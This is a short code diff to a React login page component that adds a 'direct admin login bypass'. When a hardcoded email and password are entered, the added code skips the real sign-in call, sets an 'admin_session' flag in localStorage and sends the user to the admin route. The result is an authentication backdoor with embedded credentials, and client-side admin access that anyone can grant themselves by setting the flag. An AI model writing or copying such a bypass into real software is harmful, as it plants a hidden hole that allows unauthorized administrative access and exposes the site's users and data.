@@ -39,6 +39,14 @@ export function LoginPage() {
     setIsLoading(true);
     setError(null);
 
+    // Direct admin login bypass
+    if (email === 'mdgiwksdbsj942@gmail.com' && password === 'sgr@2007') {
+      localStorage.setItem('admin_session', 'true');
+      navigate('/admin');
+      setIsLoading(false);
+      return;
+    }
+
     try {
       const { error: signInError } = await signIn(email, password);
       if (signInError) throw signInError;
